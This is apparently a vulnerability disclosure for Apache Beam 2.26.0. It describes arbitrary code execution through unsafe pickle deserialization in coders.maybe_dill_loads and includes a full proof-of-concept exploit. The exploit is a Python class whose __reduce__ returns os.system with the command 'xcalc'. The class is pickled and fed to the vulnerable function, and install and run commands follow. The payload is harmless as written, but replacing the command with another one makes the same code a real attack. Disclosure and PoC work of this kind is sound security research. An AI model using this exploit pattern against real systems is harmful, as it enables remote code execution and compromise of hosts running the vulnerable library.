# Description
Apache Beam is a unified model for defining both batch and streaming data-parallel processing pipelines, as well as a set of language-specific SDKs for constructing pipelines and Runners for executing them on distributed processing backends, including Apache Flink, Apache Spark, Google Cloud Dataflow and Hazelcast Jet. 
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install apache-beam==2.26.0')
from apache_beam import coders
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
coders.coders.maybe_dill_loads(dumps)
```
* `pip3 install apache-beam==2.26.0`
* `python3 exploit.py`
